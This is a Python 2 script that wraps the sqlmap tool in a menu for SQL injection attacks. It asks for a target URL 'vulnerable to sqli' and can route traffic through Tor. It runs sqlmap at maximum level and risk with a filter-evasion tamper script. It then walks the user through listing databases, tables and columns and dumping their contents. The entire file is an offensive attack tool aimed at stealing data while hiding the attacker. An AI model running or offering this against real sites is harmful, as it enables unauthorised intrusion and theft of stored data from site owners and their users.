#!/usr/bin/python2
# encoding: utf-8
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

import subprocess
def sqlinorm():
    global url
    url=raw_input("introduce the url vulnerable to sqli: ")
    if url != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"--dbs"])
        postsqli()
    else:
        sqlinorm()
def sqlitor():
    global url
    url=raw_input("introduce the url vulnerable to sqli: ")
    if url != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level=5","--risk=3","-u",url,"--dbs"])
        postsqli()
    else:
        sqlitor()

def sqlipost():
    global url
    url=raw_input("introduce the url vulnerable to sqli: ")
    global post
    post=raw_input("introduce the data post needed for the sql injection: ")
    if url != "" and post != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"--data",post,"--dbs"])
        postsqli()
    else:
        sqlipost()

def sqlipostor():
    global url
    url=raw_input("introduce the url vulnerable to sqli: ")
    global post
    post=raw_input("introduce the data post needed for the sql injection: ")
    if url != "" and post != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level=5","--risk=3","-u",url,"--data",post,"--dbs"])
        postsqli()
    else:
        sqlipostor()
def postdb():
    db=raw_input("Introduce the DataBase name for extract the tables: ")
    if db != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"-D",db,"--tables"])
    else:
        postdb()
def posttables():
    db=raw_input("Introduce the DataBase name for extract the tables: ")
    table=raw_input("Introduce the table name for extract the columns: ")
    if db != "" and table != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"-D",db,"-T",table,"--columns"])
    else:
        posttables()
def postcolumns():
    db=raw_input("Introduce the DataBase name for extract the tables: ")
    table=raw_input("Introduce the table name for extract the columns: ")
    columns=raw_input("	Introduce the column name for extract the data, or please comma-separated columns if there are several: ")
    if db != "" and table != "" and columns != "":
        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level=5","--risk=3","-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
    else:
        postcolumns()

def postsqli():
    print """ Choose what you want to do:
        a) Extract all tables from a DataBase.
        b) Extract all columns from a table.
        c) Extract all from one or more columns.
        d) Dump all DataBase.
        e) Exit.
        """
    sel=raw_input("Put your option: ")
    while sel != "e":
        if sel == "e":
            break
        elif sel == "a":
            postdb()
            postsqli()
        elif sel == "b":
            posttables()
            postsqli()
        elif sel == "c":
            postcolumns()
            postsqli()
        else:
            postsqli()

def execute():
    print"""Select your option:
    a) Sqli using sqlmap without proxy.
    b) Sqli using sqlmap with TOR.
    c) Sqli using post injection.
    d) Sqli using post injection with TOR.
    e) Back.
    """
    selec=raw_input("Put your option: ")
    if selec == "a":
        sqlinorm()
        execute()
    elif selec == "b":
        sqlitor()
        execute()
    elif selec == "c":
        sqlipost()
        execute()
    elif selec == "d":
        sqlipostor()
        execute()
    elif selec == "e":
        pass
    else:
        execute()
    
